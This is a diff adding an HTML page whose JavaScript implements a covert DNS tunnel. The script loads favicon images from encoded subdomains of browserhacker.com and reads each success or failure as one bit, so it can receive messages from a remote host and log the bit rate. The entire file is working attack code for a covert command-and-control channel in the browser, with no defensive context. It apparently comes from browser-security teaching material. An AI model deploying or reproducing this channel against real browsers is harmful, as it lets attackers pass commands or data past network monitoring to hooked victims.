@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+</head>
+<body>
+
+<script>
+var tunnel_domain = "browserhacker.com"; 
+// location of the DNS server 
+var dom = document.createElement('b');
+
+var messages = new Array(); 
+var bits = new Array(); 
+var bit_transfered = new Array(); 
+var timing = new Array(); 
+// Do the DNS query by reqeusting an image 
+send_query = function(fqdn, msg, byte, bit) 
+{ 
+	var img = new Image; 
+	img.src = "http://" + fqdn + "/favicon.ico"; 
+	img.onload = function() { 
+		// successful load so bit equals 1 
+		bits[msg][bit] = 1; 
+		bit_transfered[msg][byte]++; 
+		if (bit_transfered[msg][byte] >= 8) 
+			reconstruct_byte(msg, byte); 
+			
+		dom.removeChild(this); 
+		} 
+		
+	img.onerror = function() { 
+		// unsuccessful load so bit equals 0 
+		bits[msg][bit] = 0; 
+		bit_transfered[msg][byte]++; 
+		if (bit_transfered[msg][byte] >= 8) 
+			reconstruct_byte(msg, byte); 
+			
+		dom.removeChild(this); 
+		
+		}
+		dom.appendChild(img); 
+		
+};
+
+// Construct the request and send it via send_query 
+function get_byte(msg, byte) 
+{ 
+	bit_transfered[msg][byte] = 0 
+	// Request the byte one bit at a time 
+	for(var bit=byte*8; bit < (byte*8)+8; bit++)
+	{ 
+		// Set the message number (hex) 
+		msg_str = ("00000000" + msg.toString(16)).substr(-8); 
+		// Set the bit number (hex) 
+		bit_str = ("00000000" + bit.toString(16)).substr(-8); 
+		// Build the subdomain 
+		subdomain = "bit-" + msg_str +"-" + bit_str; 
+		// build the full domain 
+		domain = subdomain + '.' + tunnel_domain; 
+		// Request something like // bit-00000002-0000003e.browserhacker.com 
+		send_query(domain, msg, byte, bit) 
+	} 
+	
+}
+		
+		
+// Build the environment and request the message 
+function get_message(msg) 
+{ 
+	// Set variables for getting a message 
+	messages[msg] = ""; 
+	bits[msg] = new Array(); 
+	bit_transfered[msg] = new Array(); 
+	timing[msg] = Date.now(); 
+	get_byte(msg, 0);
+
+}
+
+
+// Build the data returned from the binary results 
+
+function reconstruct_byte(msg, byte)
+{ 
+	var char = 0; 
+	// Build the last byte requested 
+	for(var bit=byte*8; bit < (byte*8)+8; bit++)
+	{ 
+		char <<= 1; char += bits[msg][bit] ; 
+		
+	} 
+	
+	// Message is terminated with a null byte (all failed DNS requests) 
+	if (char != 0) 
+	{ 
+		// The message isn't terminated so get the next byte 
+		messages[msg] += String.fromCharCode(char); 
+		get_byte(msg, byte+1); 
+		
+	} else { 
+		// The message is terminated so finish 
+		delta = (Date.now() - timing[msg])/1000; 
+		bytes_per_second = "" + ((messages[msg].length + 1) * 8)/delta; console.log(messages[msg] + " - (" + (bytes_per_second.substr(0,5)) + " bits/second)"); 
+		
+	} 
+	
+}
+
+get_message(0);
+			
+		
+		
+</script>
+
+</body>
+</html>
